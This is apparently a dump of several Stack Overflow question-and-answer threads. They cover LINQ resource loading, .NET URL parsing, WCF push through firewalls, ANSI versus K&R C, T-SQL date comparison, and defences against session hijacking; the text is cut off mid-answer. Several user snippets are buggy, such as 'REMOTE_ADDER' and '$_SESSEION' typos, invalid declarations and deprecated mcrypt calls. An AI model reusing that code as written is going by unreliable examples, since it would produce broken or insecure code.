m_ImageList = l_Assembly.GetManifestResourceNames()
    .Where(a =&gt; a.EndsWith("".png""))
    .OrderBy(b =&gt; b)
    .Select(c =&gt; l_Assembly.GetManifestResourceStream(c))
    .Where(d =&gt; d != null)  //ImageStream not null
    .Select(e =&gt; Bitmap.FromStream(e))
    .Where(f =&gt; f != null)  //Bitmap not null
    .ToList();
</code></pre>

<p>Or, alternatively (<em>query syntax</em>):</p>

<pre><code>Assembly l_Assembly = Assembly.GetExecutingAssembly();

//Linq is the tops
m_ImageList = (
    from resource in l_Assembly.GetManifestResourceNames()
    where resource.EndsWith("".png"")
    orderby resource
    let imageStream = l_Assembly.GetManifestResourceStream(resource)
    where imageStream != null
    let bitmap = Bitmap.FromStream(imageStream)
    where bitmap != null)
    .ToList();
</code></pre>
 <p>Because linq is really monads in sql clothing, I'm using it on a project to make asynchronous web requests with the continuation monad, and it's proving to work really well!</p>

<p>Check out these articles:
<a href=""http://www.aboutcode.net/2008/01/14/Async%2BWebRequest%2BUsing%2BLINQ%2BSyntax.aspx"">http://www.aboutcode.net/2008/01/14/Async+WebRequest+Using+LINQ+Syntax.aspx</a>
<a href=""http://blogs.msdn.com/wesdyer/archive/2008/01/11/the-marvels-of-monads.aspx"">http://blogs.msdn.com/wesdyer/archive/2008/01/11/the-marvels-of-monads.aspx</a></p>

<p>From the first article:</p>

<pre><code>    var requests = new[] 
    {
        WebRequest.Create(""http://www.google.com/""),
        WebRequest.Create(""http://www.yahoo.com/""),
        WebRequest.Create(""http://channel9.msdn.com/"")
    };

    var pages = from request in requests
                select
                    from response in request.GetResponseAsync()
                    let stream = response.GetResponseStream()
                    from html in stream.ReadToEndAsync()
                    select new { html, response };

    foreach (var page in pages)
    {
        page(d =&gt;
        {
            Console.WriteLine(d.response.ResponseUri.ToString());
            Console.WriteLine(d.html.Substring(0, 40));
            Console.WriteLine();
        });
    }
</code></pre>
"
".NET - Get protocol, host, and port <p>Is there a simple way in <em>.NET</em> to quickly get the current protocol, host, and port? For example, if I'm on the following URL:</p>

<p><code>http://www.mywebsite.com:80/pages/page1.aspx</code></p>

<p>I need to return:</p>

<p><code>http://www.mywebsite.com:80</code></p>

<p>I know I can use <code>Request.Url.AbsoluteUri</code> to get the complete URL, and I know I can use <code>Request.Url.Authority</code> to get the host and port, but I'm not sure of the best way to get the protocol without parsing out the URL string.</p>

<p>Any suggestions?</p>
 <p>Request.Url will return you the <a href=""http://msdn.microsoft.com/en-us/library/system.uri.aspx"">Uri</a> of the request.  Once you have that, you can retrieve pretty much anything you want.  To get the protocol, call the <a href=""http://msdn.microsoft.com/en-us/library/system.uri.scheme.aspx"">Scheme</a> property.</p>

<p>Sample:</p>

<pre><code>Uri url = Request.Url;
string protocol = url.Scheme;
</code></pre>

<p>Hope this helps.</p>
 <p>The following (C#) code should do the trick</p>

<pre><code>Uri uri = new Uri(""http://www.mywebsite.com:80/pages/page1.aspx"");
string requested = uri.Scheme + Uri.SchemeDelimiter + uri.Host + "":"" + uri.Port;
</code></pre>
 <p>Even though @Rick has the accepted answer for this question, there's actually a shorter way to do this, using the poorly named <code>Uri.GetLeftPart()</code> method.</p>

<pre><code>Uri url = new Uri(""http://www.mywebsite.com:80/pages/page1.aspx"");
string output = url.GetLeftPart(UriPartial.Authority);
</code></pre>

<p>There is one catch to <code>GetLeftPart()</code>, however. If the port is the default port for the scheme, it will strip it out. Since port 80 is the default port for http, the output of <code>GetLeftPart()</code> in my example above will be <code>http://www.mywebsite.com</code>. </p>

<p>If the port number had been something other than 80, it would be included in the result.</p>
 <p>Well if you are doing this in Asp.Net or have access to HttpContext.Current.Request
I'd say these are easier and more general ways of getting them:</p>

<pre><code>var scheme = Request.Url.Scheme; // will get http, https, etc.
var host = Request.Url.Host; // will get www.mywebsite.com
var port = Request.Url.Port; // will get the port
var path = Request.Url.AbsolutePath; // should get the /pages/page1.aspx part, can't remember if it only get pages/page1.aspx
</code></pre>

<p>I hope this helps. :)</p>
 <p>A more structured way to get this is to use UriBuilder. This avoids direct string manipulation. </p>

<pre><code>var builder = new UriBuilder(Request.Url.Scheme, Request.Url.Host, Request.Url.Port);
</code></pre>
 <p>Even shorter way, may require newer ASP.Net:</p>

<pre class=""lang-cs prettyprint-override""><code>string authority = Request.Url.GetComponents(UriComponents.SchemeAndServer,UriFormat.Unescaped)
</code></pre>

<p>The UriComponents enum lets you specify which component(s) of the URI you want to include.</p>
 <p>Very similar to Holger's answer. If you need to grab the URL can do something like: </p>

<pre><code>Uri uri = Context.Request.Url;         
var scheme = uri.Scheme // returns http, https
var scheme2 = uri.Scheme + Uri.SchemeDelimiter; // returns http://, https://
var host = uri.Host; // return www.mywebsite.com
var port = uri.Port; // returns port number
</code></pre>

<p>The <a href=""https://msdn.microsoft.com/en-us/library/system.uri(v=vs.110).aspx"" rel=""nofollow"">Uri class</a> provides a whole range of methods, many which I have not listed. </p>

<p>In my instance, I needed to grab <code>LocalHost</code> along with the <code>Port Number</code>, so this is what I did: </p>

<pre><code>var Uri uri = Context.Request.Url;
var host = uri.Scheme + Uri.SchemeDelimiter + uri.Host + "":"" + uri.Port; 
</code></pre>

<p>Which successfully grabbed: <code>http://localhost:12345</code></p>
"
"WCF push to client through firewall? <blockquote>
  <p>See also <a href=""http://stackoverflow.com/questions/1700917/how-does-a-wcf-server-inform-a-wcf-client-about-changes-better-solution-then-si"">How does a WCF server inform
  a WCF client about changes? (Better
  solution then simple polling, e.g.
  Coment or long polling)</a></p>
</blockquote>

<p>I need to use push-technology with WCF through client firewalls. This must be a common problem, and I know for a fact it works in theory (see links below), but I have failed to get it working, and I haven't been able to find a code sample that demonstrates it.</p>

<p>Requirements: </p>

<ul>
<li>WCF</li>
<li>Clients connects to server through tcp port 80 (netTcpBinding).</li>
<li>Server pushes back information at irregular intervals (1 min to several hours).</li>
<li>Users should not have to configure their firewalls, server pushes must pass through firewalls that have all inbound ports closed. TCP duplex on the same connection is needed for this, a dual binding does not work since a port has to be opened on the client firewall.</li>
<li>Clients sends heartbeats to server at regular intervals (perhaps every 15 mins) so server knows client is still alive.</li>
<li>Server is IIS7 with WAS.</li>
</ul>

<p>The solution seems to be duplex netTcpBinding. Based on this information:</p>

<p><a href=""http://blogs.msdn.com/drnick/archive/2006/05/01/configuring-wcf-for-nats-and-firewalls.aspx"">WCF through firewalls and NATs</a></p>

<p><a href=""http://blogs.msdn.com/drnick/archive/2006/10/20/keeping-connections-open-in-iis.aspx"">Keeping connections open in IIS</a></p>

<p>But I have yet to find a code sample that works.. I've tried combining the ""Duplex"" and ""TcpActivation"" samples from Microsoft's WCF Samples without any luck. Please can someone point me to example code that works, or build a small sample app. Thanks a lot!</p>
 <p>In most firewall setups, the TCP connection will be torn down by the firewall if it is idle to conserve resources. The idle timeout is probably not something you can control. Some will tear them down if they are idle and a resource limit is being hit.</p>

<p>Most corp environments won't allow any machines to make an outbound TCP connection anyway.</p>

<p>Also, using this mechanism means you are going to have scaling problems. I think more reliable solution is to queue up information and have your clients poll for them regularly. Utilize caching if possible such that a subsequent client poll will get the cached data from the customers proxy cache, if they are using one.</p>

<p>If you have to push data in a timely manner, in sub-second land (i.e. financial services), then consider some messaging infrastructure such an NServiceBus distributor on client side, but that will require a customer install...</p>

<p>So have you tried using Toredo? Having read that it would appear there it is prob too complicated for a user to setup.</p>
 <p>I have not tried the scenario you speak of so I can't be too much help, sorry. If all you need to bypass is the client firewall you might want to check out <a href=""http://stackoverflow.com/questions/113755/programmatically-add-an-application-to-windows-firewall"">this post</a>. </p>

<p>Good luck.</p>
 <p>Have you tried looking at: <a href=""http://www.codeproject.com/KB/WCF/WCF_Duplex_UI_Threads.aspx"" rel=""nofollow"">http://www.codeproject.com/KB/WCF/WCF_Duplex_UI_Threads.aspx</a></p>

<p>Can you provide examples of what you have already attempted? With details of firewalls etc, error messages?</p>

<p>If both client and server can be addressed directly and firewalls are not an issue, have you considered allowing clients to register a URL providing a supported contract. The server can then call this service whenever it needs to, without the need to establish a long running (but mostly idle connection), avoids the need for heart beating and can be made resilient across sessions\connections.</p>
 <p>I've found a couple of solutions:</p>

<p><a href=""http://www.zeroc.com/"" rel=""nofollow"" title=""ZeroC Ice"">ZeroC Ice</a> GPL with a commercial option. Have only tested quickly. Looks more powerful than .NET Remoting and is very actively developed.</p>

<p><a href=""http://www.remobjectssdk.com/"" rel=""nofollow"" title=""RemObjects"">RemObjects</a> Commercial, active development, supports everything but does not seem to have all the more advanced features that GenuineChannels use.</p>

<p><a href=""http://www.genuinechannels.com/"" rel=""nofollow"" title=""GenuineChannels"">GenuineChannels</a>. It uses remoting with a lot of nice added features, the most important one being it works through NATs without the need to open the client firewall. Unfortunately seems to be very dead.</p>

<p>Another solution is to use streaming with IIS, according to this article: <a href=""http://blogs.msdn.com/drnick/archive/2006/10/20/keeping-connections-open-in-iis.aspx"" rel=""nofollow"" title=""Keeping connections open in IIS"">Keeping connections open in IIS</a></p>

<p>The client makes the first connection (http with IIS6, tcp with IIS7) to the server at port 80, the connection is then kept open with a streaming response that never ends.</p>

<p>I haven't had the time to experiment with this, and I haven't found a sample that says it specifically solves the firewall-problem, but here's an excellent sample that probably works: <a href=""http://blogs.thinktecture.com/buddhike/archive/2007/05/23/414851.aspx"" rel=""nofollow"">Streaming XML</a>. </p>
 <p>Have you tried this one? 
<a href=""http://code.msdn.microsoft.com/duplexhttp"" rel=""nofollow"">DuplexHttpBinding</a></p>

<p>It is using smart polling technique encapsulated as custom WCF binding. So it should work out of the box.</p>
 <p>You can do following change in client for accessing duplex web service on Firewall enabled client.</p>

<ul>
<li>Set WebHttp option checked in Firewall -> Advanced -> Settings (of Network Connection Setting) -> Web Server (Http)</li>
</ul>
"
"What are the major differences between ANSI C and K&R C? <p>The <a href=""http://en.wikipedia.org/wiki/ANSI_C"">Wikipedia article on ANSI C</a> says:</p>

<blockquote>
  <p>One of the aims of the ANSI C standardization process was to produce a superset of K&amp;R C (the first published standard), incorporating many of the unofficial features subsequently introduced. However, the standards committee also included several new features, such as function prototypes (borrowed from the C++ programming language), and a more capable preprocessor. The syntax for parameter declarations was also changed to reflect the C++ style.</p>
</blockquote>

<p>That makes me think that there are differences. However, I didn't see a comparison between K&amp;R C and ANSI C. Is there such a document? If not, what are the major differences?</p>

<p>EDIT: I believe the K&amp;R book says ""ANSI C"" on the cover. At least I believe the version that I have at home does. So perhaps there isn't a difference anymore?</p>
 <p>The biggest single difference, I think, is function prototyping and the syntax for describing the types of function arguments.</p>
 <p>There are some minor differences, but I think later editions of K&amp;R are for ANSI C, so there's no real difference anymore.<br />
""C Classic"" for lack of a better terms had a slightly different way of defining functions, i.e.  </p>

<pre><code>int f( p, q, r )  
int p, float q, double r;  
{  
    // Code goes here  
}
</code></pre>

<p>I believe the other difference was function prototypes. Prototypes didn't have to - in fact they couldn't - take a list of arguments or types. In ANSI C they do.</p>
 <p>There may be some confusion here about what ""K&amp;R C"" is. The term refers to the language as documented in the first edition of ""The C Programming Language."" Roughly speaking: the input language of the Bell Labs C compiler circa 1978.</p>

<p>Kernighan and Ritchie were involved in the ANSI standardization process. The ""ANSI C"" dialect superceded ""K&amp;R C"" and subsequent editions of ""The C Programming Language"" adopt the ANSI conventions. ""K&amp;R C"" is a ""dead language,"" except to the extent that some compilers still accept legacy code.</p>
 <p>Function prototypes were the most obvious change between K&amp;R C and C89, but there were plenty of others.  A lot of important work went into standardizing the C library, too.  Even though the standard C library was a codification of existing practice, it codified <em>multiple</em> existing practices, which made it more difficult.  P.J. Plauger's book, <a href=""http://rads.stackoverflow.com/amzn/click/0131315099""><em>The Standard C Library</em></a>, is a great reference, and also tells some of the behind-the-scenes details of <em>why</em> the library ended up the way it did.</p>

<p>The ANSI/ISO standard C is very similar to K&amp;R C in most ways.  It was intended that most existing C code should build on ANSI compilers without many changes.  Crucially, though, in the pre-standard era, the semantics of the language were open to interpretation by each compiler vendor.  ANSI C brought in a common description of language semantics which put all the compilers on an equal footing.  It's easy to take this for granted now, some 20 years later, but this was a significant achievement.</p>

<p>For the most part, if you don't have a pre-standard C codebase to maintain, you should be glad you don't have to worry about it.  If you do--or worse yet, if you're trying to bring an old program up to more modern standards--then you have my sympathies.</p>
 <p>Another difference is that function return types and parameter types did not need to be defined. They would be assumed to be ints.</p>

<pre><code>f(x)
{
    return x + 1;
}
</code></pre>

<p>and</p>

<pre><code>int f(x)
int x;
{
    return x + 1;
}
</code></pre>

<p>are identical.</p>
 <p>The difference is:</p>

<ol>
<li>Prototype</li>
<li>wide character support and internationalisation</li>
<li>Support for const and volatile keywords</li>
<li>permit function pointers to be used as dereferencing</li>
</ol>
 <ol>
<li>function prototype.</li>
<li>constant &amp; volatile qualifiers.</li>
<li>wide character support and internationalization.</li>
<li>permit function pointer to be used without dereferencing.</li>
</ol>
 <ul>
<li>FUNCTION PROTOTYPING:ANSI C adopts c++ function prototype technique where function definaton and declaration include function names,arguments t,data types and return value data types.function prototype enable ANSI ccompilers to check for function call in user program that passes invalid number number of argument or incompatiblle argument data types.these fix a major weakness of the K&amp;R C compilers:invalid call in user program often passes compilation but cause program to crash when they are executed</li>
</ul>
 <p>The major differences between ANSI C and K&amp;R C are as follows:</p>

<ul>
<li>function prototyping</li>
<li>support of the const and volatile data type qualifiers</li>
<li>support wide characters and internationalization</li>
<li>permit function pointers to be used without dereferencing</li>
</ul>

<p>ANSI C adopts c++ function prototype technique where function definition and declaration include function names,arguments' data types, and return value data types. Function prototype enable ANSI C compiler to check for function calls in user programs that pass invalid numbers of arguments or incompatible arguments data types. These fix major weakness of the K&amp;R C compiler.</p>

<p>Example: to declares a function foo and requires that foo take two arguments</p>

<pre><code> unsigned long foo (char* fmt, double data)
 {
      /*body of foo */
 }
</code></pre>
 <p>A major difference nobody has yet mentioned is that before ANSI, C was defined largely by precedent rather than specification; in cases where certain operations would have predictable consequences on some platforms but not others (e.g. using relational operators on two unrelated pointers), precedent strongly favored making platform guarantees available to the programmer.  For example:</p>

<ol>
<li><p>On platforms which define a natural ranking among all pointers to all objects, application of the relational operators to arbitrary pointers could be relied upon to yield that ranking.</p></li>
<li><p>On platforms where the natural means of testing whether one pointer is ""greater than"" another never has any side-effect other than yielding a true or false value, application of the relational operators to arbitrary pointers could likewise be relied upon never to have any side-effects other than yielding a true or false value.</p></li>
<li><p>On platforms where two or more integer types shared the same size and representation, a pointer to any such integer type could be relied upon to read or write information of any other type with the same representation.</p></li>
<li><p>On two's-complement platforms where integer overflows naturally wrap silently, an operation involving an unsigned values smaller than ""int"" could be relied upon to behave as though the value was unsigned in cases where the result would be between INT_MAX+1u and UINT_MAX and it was not promoted to a larger type, nor used as the left operand of <code>&gt;&gt;</code>, nor either operand of <code>/</code>, <code>%</code>, or any comparison operator.  <em>Incidentally, the rationale for the Standard gives this as one of the reasons small unsigned types promote to signed</em>.</p></li>
</ol>

<p>Prior to C89, it was unclear to what lengths compilers for platforms where the above assumptions wouldn't naturally hold might be expected to go to uphold those assumptions anyway, but there was little doubt that compilers for platforms which could easily and cheaply uphold such assumptions should do so.  The authors of the C89 Standard didn't bother to expressly say that because:</p>

<ol>
<li><p>Compilers whose writers weren't being deliberately obtuse would continue doing such things when practical without having to be told (the rationale given for promoting small unsigned values to signed strongly reinforces this view).</p></li>
<li><p>The Standard only required implementations to be capable of running one possibly-contrived program without a stack overflow, and recognized that while an obtuse implementation could treat any other program as invoking Undefined Behavior but didn't think it was worth worrying about obtuse compiler writers writing implementations that were ""conforming"" but useless.</p></li>
</ol>

<p>Although ""C89"" was interpreted contemporaneously as meaning ""the language defined by C89, plus whatever additional features and guarantees the platform provides"", the authors of gcc have been pushing an interpretation which excludes any features and guarantees beyond those mandated by C89.</p>
"
"What's a good way to check if two datetimes are on the same calendar day in TSQL? <p>Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.</p>

<p>In this case, merging the function code back into the query seems impractical.</p>

<p>I think I am missing something simple here.</p>

<p>Here's the function for reference.</p>

<pre><code>if not exists (select * from dbo.sysobjects 
              where id = object_id(N'dbo.f_MakeDate') and               
              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))
  exec('create function dbo.f_MakeDate() returns int as 
         begin declare @retval int return @retval end')
go

alter function dbo.f_MakeDate
(
    @Day datetime, 
    @Hour int, 
    @Minute int
)
returns datetime
as

/*

Creates a datetime using the year-month-day portion of @Day, and the 
@Hour and @Minute provided

*/

begin

declare @retval datetime
set @retval = cast(
    cast(datepart(m, @Day) as varchar(2)) + 
    '/' + 
    cast(datepart(d, @Day) as varchar(2)) + 
    '/' + 
    cast(datepart(yyyy, @Day) as varchar(4)) + 
    ' ' + 
    cast(@Hour as varchar(2)) + 
    ':' + 
    cast(@Minute as varchar(2)) as datetime)
return @retval
end

go
</code></pre>

<p>To complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:</p>

<pre><code>where 
dbo.f_MakeDate(dateadd(hh, tz.Offset + 
    case when ds.LocalTimeZone is not null 
    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight
</code></pre>

<p>[Edit]</p>

<p>I'm incorporating @Todd's suggestion:</p>

<pre><code>where datediff(day, dateadd(hh, tz.Offset + 
    case when ds.LocalTimeZone is not null 
    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0
</code></pre>

<p>My misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.</p>

<p>But the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.</p>
 <pre><code>where
year(date1) = year(date2)
and month(date1) = month(date2)
and day(date1) = day(date2)
</code></pre>
 <p>This is much more concise:</p>

<pre><code>where 
  datediff(day, date1, date2) = 0
</code></pre>
 <p>this will remove time component from a date for you:  </p>

<pre><code>select dateadd(d, datediff(d, 0, current_timestamp), 0)
</code></pre>
 <p>You pretty much have to keep the left side of your where clause clean. So, normally, you'd do something like:</p>

<pre><code>WHERE MyDateTime &gt;= @activityDateMidnight 
      AND MyDateTime &lt; (@activityDateMidnight + 1)
</code></pre>

<p>(Some folks prefer DATEADD(d, 1, @activityDateMidnight) instead - but it's the same thing).</p>

<p>The TimeZone table complicates matter a bit though. It's a little unclear from your snippet, but it looks like t.TheDateInTable is in GMT with a Time Zone identifier, and that you're then adding the offset to compare against @activityDateMidnight - which is in local time. I'm not sure what ds.LocalTimeZone is, though.</p>

<p>If that's the case, then you need to get @activityDateMidnight into GMT instead.</p>
 <p>Make sure to read <a href=""http://blogs.lessthandot.com/index.php/DataMgmt/DataDesign/only-in-a-database-can-you-get-1000-impr"" rel=""nofollow"">Only In A Database Can You Get 1000% + Improvement By Changing A Few Lines Of Code</a> so that you are sure that the optimizer can utilize the index effectively when messing with dates</p>
 <p>You're spoilt for choice in terms of options here. If you are using Sybase or SQL Server 2008 you can create variables of type date and assign them your datetime values. The database engine gets rid of the time for you. Here's a quick and dirty test to illustrate (Code is in Sybase dialect):</p>

<pre><code>declare @date1 date
declare @date2 date
set @date1='2008-1-1 10:00'
set @date2='2008-1-1 22:00'
if @date1=@date2
    print 'Equal'
else
    print 'Not equal'
</code></pre>

<p>For SQL 2005 and earlier what you can do is convert the date to a varchar in a format that does not have the time component. For instance the following returns 2008.08.22</p>

<pre><code>select convert(varchar,'2008-08-22 18:11:14.133',102)
</code></pre>

<p>The 102 part specifies the formatting (Books online can list for you all the available formats)</p>

<p>So, what you can do is write a function that takes a datetime and extracts the date element and discards the time. Like so:</p>

<pre><code>create function MakeDate (@InputDate datetime) returns datetime as
begin
    return cast(convert(varchar,@InputDate,102) as datetime);
end
</code></pre>

<p>You can then use the function for companions</p>

<pre><code>Select * from Orders where dbo.MakeDate(OrderDate) = dbo.MakeDate(DeliveryDate)
</code></pre>
 <p>I would use the dayofyear function of datepart:</p>

<pre><code>
Select *
from mytable
where datepart(dy,date1) = datepart(dy,date2)
and
year(date1) = year(date2) --assuming you want the same year too
</code></pre>

<p>See the datepart reference <a href=""http://www.tizag.com/sqlTutorial/sqldatepart.php"" rel=""nofollow"">here</a>.</p>
 <p>Regarding timezones, yet one more reason to store all dates in a single timezone (preferably UTC). Anyway, I think the answers using datediff, datepart and the different built-in date functions are your best bet.</p>
 <p>Eric Z Beard:</p>

<blockquote>
  <p>I do store all dates in GMT. Here's the use case: something happened at 11:00 PM EST on the 1st, which is the 2nd GMT. I want to see activity for the 1st, and I am in EST so I will want to see the 11PM activity. If I just compared raw GMT datetimes, I would miss things. Each row in the report can represent an activity from a different time zone.</p>
</blockquote>

<p>Right, but when you say you're interested in activity for Jan 1st 2008 EST:</p>

<pre><code>SELECT @activityDateMidnight = '1/1/2008', @activityDateTZ = 'EST'
</code></pre>

<p>you just need to convert <em>that</em> to GMT (I'm ignoring the complication of querying for the day before EST goes to EDT, or vice versa):</p>

<pre><code>Table: TimeZone
Fields: TimeZone, Offset
Values: EST, -4

--Multiply by -1, since we're converting EST to GMT.
--Offsets are to go from GMT to EST.
SELECT @activityGmtBegin = DATEADD(hh, Offset * -1, @activityDateMidnight)
FROM TimeZone
WHERE TimeZone = @activityDateTZ
</code></pre>

<p>which should give you '1/1/2008 4:00 AM'. Then, you can just search in GMT:</p>

<pre><code>SELECT * FROM EventTable
WHERE 
   EventTime &gt;= @activityGmtBegin --1/1/2008 4:00 AM
   AND EventTime &lt; (@activityGmtBegin + 1) --1/2/2008 4:00 AM
</code></pre>

<p>The event in question is stored with a GMT EventTime of 1/2/2008 3:00 AM. You don't even need the TimeZone in the EventTable (for this purpose, at least). </p>

<p>Since EventTime is not in a function, this is a straight index scan - which should be pretty efficient. Make EventTime your clustered index, and it'll fly. ;)</p>

<p>Personally, I'd have the app convert the search time into GMT before running the query.</p>
 <p>@Eric: No you won't miss anything. If you want to see what happened at 11pm EST, you look for things that happened at the corresponding time in GMT. If all the records are converted into GMT before saving, it shouldn't matter. So long as you convert the requested time (i.e. 11pm) to GMT before using it in the query.</p>
 <p>Eric Z Beard:</p>

<blockquote>
  <p>the activity date is meant to indicate the local time zone, but not a specific one</p>
</blockquote>

<p>Okay - back to the drawing board. Try this:</p>

<pre><code>where t.TheDateINeedToCheck BETWEEN (
    dateadd(hh, (tz.Offset + ISNULL(ds.LocalTimeZone, 0)) * -1, @ActivityDate)
    AND
    dateadd(hh, (tz.Offset + ISNULL(ds.LocalTimeZone, 0)) * -1, (@ActivityDate + 1))
)
</code></pre>

<p>which will translate the @ActivityDate to local time, and compare against that. That's your best chance for using an index, though I'm not sure it'll work - you should try it and check the query plan.</p>

<p>The next option would be an indexed view, with an indexed, computed TimeINeedToCheck <em>in local time</em>. Then you just go back to:</p>

<pre><code>where v.TheLocalDateINeedToCheck BETWEEN @ActivityDate AND (@ActivityDate + 1)
</code></pre>

<p>which would definitely use the index - though you have a slight overhead on INSERT and UPDATE then.</p>
"
"What is the best way to prevent session hijacking? <p>Specifically this is regarding when using a client session cookie to identify a session on the server.</p>

<p>Is the best answer to use SSL/HTTPS encryption for the entire web site, and you have the best guarantee that no man in the middle attacks will be able to sniff an existing client session cookie?</p>

<p>And perhaps second best to use some sort of encryption on the session value itself that is stored in your session cookie?</p>

<p>If a malicious user has physical access to a machine, they can still look at the filesystem to retrieve a valid session cookie and use that to hijack a session?</p>
 <p>To reduce the risk you can also associate the originating IP with the session. That way an attacker has to be within the same private network to be able to use the session.</p>

<p>Checking referer headers can also be an option but those are more easily spoofed.</p>
 <p>Encrypting the session value will have zero effect. The session cookie is already an arbitrary value, encrypting it will just generate another arbitrary value that can be sniffed.</p>

<p>The only real solution is HTTPS. If you don't want to do SSL on your whole site (maybe you have performance concerns), you might be able to get away with only SSL protecting the sensitive areas. To do that, first make sure your login page is HTTPS. When a user logs in, set a secure cookie (meaning the browser will only transmit it over an SSL link) in addition to the regular session cookie. Then, when a user visits one of your ""sensitive"" areas, redirect them to HTTPS, and check for the presence of that secure cookie. A real user will have it, a session hijacker will not.</p>

<p><strong>EDIT</strong>: This answer was originally written in 2008. It's 2016 now, and there's no reason not to have SSL across your entire site. No more plaintext HTTP!</p>
 <p>The SSL only helps with sniffing attacks. If an attacker has access to your machine I will assume they can copy your secure cookie too.  </p>

<p>At the very least, make sure old cookies lose their value after a while. Even a successful hijaking attack will be thwarted when the cookie stops working. If the user has a cookie from a session that logged in more than a month ago, make them reenter their password. Make sure that whenever a user clicks on your site's ""log out"" link, that the old session UUID can never be used again. </p>

<p>I'm not sure if this idea will work but here goes: Add a serial number into your session cookie, maybe a string like this:</p>

<p>SessionUUID, Serial Num, Current Date/Time</p>

<p>Encrypt this string and use it as your session cookie. Regularly change the serial num - maybe when the cookie is 5 minutes old and then reissue the cookie.  You could even reissue it on every page view if you wanted to. On the server side, keep a record of the last serial num you've issued for that session.  If someone ever sends a cookie with the wrong serial number it means that an attacker may be using a cookie they intercepted earlier so invalidate the session UUID and ask the user to reenter their password and then reissue a new cookie.</p>

<p>Remember that your user may have more than one computer so they may have more than one active session. Don't do something that forces them to log in again every time they switch between computers.</p>
 <p>Ensure you don't use incremting integers for session IDs.  Much better to use a GUID, or some other long randomly generated character string.</p>
 <p>Try Secure Cookie protocol described in <a href=""http://www.cse.msu.edu/~alexliu/publications/Cookie/cookie.pdf"" rel=""nofollow"">this</a> paper by Liu, Kovacs, Huang, and Gouda:</p>

<p>As stated in document:</p>

<blockquote>
  <p>A secure
  cookie protocol that runs between a client and a server
  needs to provide the following four services: authentication, confidentiality, integrity and anti-replay.</p>
</blockquote>

<p>As for ease of deployment:</p>

<blockquote>
  <p>In terms of efficiency, our protocol does not involve any database
  lookup or public key cryptography. In terms of deployability, our protocol can be easily deployed on an existing web server, and it does not require any change to
  the Internet cookie specication.</p>
</blockquote>

<p>In short: it is secure, lightweight, works for me just great.</p>
 <p>Protect by:</p>

<pre><code>$ip=$_SERVER['REMOTE_ADDER'];
$_SESSEION['ip']=$ip;
</code></pre>
 <p>Have you considered reading a book on PHP security? Highly recommended.</p>

<p>I have had much success with the following method for non SSL certified sites.</p>

<ol>
<li><p>Dis-allow multiple sessions under the same account, making sure you aren't checking this soely by IP address. Rather check by token generated upon login which is stored with the users session in the database, as well as IP address, HTTP_USER_AGENT and so forth</p></li>
<li><p>Using Relation based hyperlinks
Generates a link ( eg. <a href=""http://mysite.com/secure.php?token=2349df98sdf98a9asdf8fas98df8"">http://mysite.com/secure.php?token=2349df98sdf98a9asdf8fas98df8</a> )
The link is appended with a x-BYTE ( preferred size ) random salted MD5 string, upon page              redirection the randomly generated token corresponds to a requested page. </p>

<ul>
<li>Upon reload, several checks are done. </li>
<li>Originating IP Address</li>
<li>HTTP_USER_AGENT </li>
<li>Session Token</li>
<li>you get the point.</li>
</ul></li>
<li><p>Short Life-span session authentication cookie.
as posted above, a cookie containing a secure string, which is one of the direct references to the sessions validity is a good idea. Make it expire every x Minutes, reissuing that token, and re-syncing the session with the new Data. If any mis-matches in the data, either log the user out, or having them re-authenticate their session.</p></li>
</ol>

<p>I am in no  means an expert on the subject, I'v had a bit of experience in this particular topic, hope some of this helps anyone out there.  </p>
 <p>First of all sory for my bad english.</p>

<p>There is no way to prevent session hijaking 100%, but with some aproach can we reduce the time for an attaker to hijaking the session.</p>

<p>Method to prevent session hijaking:</p>

<p>1 - always use session with ssl certificate;</p>

<p>2 - send session cookie only with httponly set to true(prevent javascript to access session cookie)</p>

<p>2 - use session regenerate id at login and logout(note: do not use session regenerate at each request because if you have consecutive ajax request then you have a chance to create multiple session.)</p>

<p>3 - set a session timeout</p>

<p>4 - store browser user agent in a $_SESSION variable an compare with $_SERVER['HTTP_USER_AGENT'] at each request</p>

<p>5 - set a token cookie ,and set expiration time of that cookie to 0(until the browser is closed).
Regenerate the cookie value for each request.(For ajax request do not regenerate token cookie).
EX:</p>

<pre><code>    //set a token cookie if one not exist
    if(!isset($_COOKIE['user_token'])){
                    //generate a random string for cookie value
        $cookie_token = bin2hex(mcrypt_create_iv('16' , MCRYPT_DEV_URANDOM));

        //set a session variable with that random string
        $_SESSION['user_token'] = $cookie_token;
        //set cookie with rand value
        setcookie('user_token', $cookie_token , 0 , '/' , 'donategame.com' , true , true);
    }

    //set a sesison variable with request of www.example.com
    if(!isset($_SESSION['request'])){
        $_SESSION['request'] = -1;
    }
    //increment $_SESSION['request'] with 1 for each request at www.example.com
    $_SESSION['request']++;

    //verify if $_SESSION['user_token'] it's equal with $_COOKIE['user_token'] only for $_SESSION['request'] &gt; 0
    if($_SESSION['request'] &gt; 0){

        // if it's equal then regenerete value of token cookie if not then destroy_session
        if($_SESSION['user_token'] === $_COOKIE['user_token']){
            $cookie_token = bin2hex(mcrypt_create_iv('16' , MCRYPT_DEV_URANDOM));

            $_SESSION['user_token'] = $cookie_token;

            setcookie('user_token', $cookie_token , 0 , '/' , 'donategame.com' , true , true);
        }else{
            //code for session_destroy


        }

    }

            //prevent session hijaking with browser user agent
    if(!isset($_SESSION['user_agent'])){
        $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
    }

    if($_SESSION['user_agent'] != $_SERVER['HTTP_USER_AGENT']){
      die('session hijaking - user agent');
    }
</code></pre>

<p>note: do not regenerate token cookie with ajax request
note: the code above is an example.
note: if users logout then the cookie token must be destroyed as well as the session</p>

<p>6 - it's not a good aproach to use user ip for preventing session hijaking because some users ip change with each request. THAT AFFECT VALID USERS</p>

<p>7 - personaly i store session data in database , it's up to you what method you adopt</p>

<p>If you find mistake in my aproch please correct me. If you have more ways to prevent session hyjaking plese tell me.</p>
 <pre><code>// Collect this information on every request
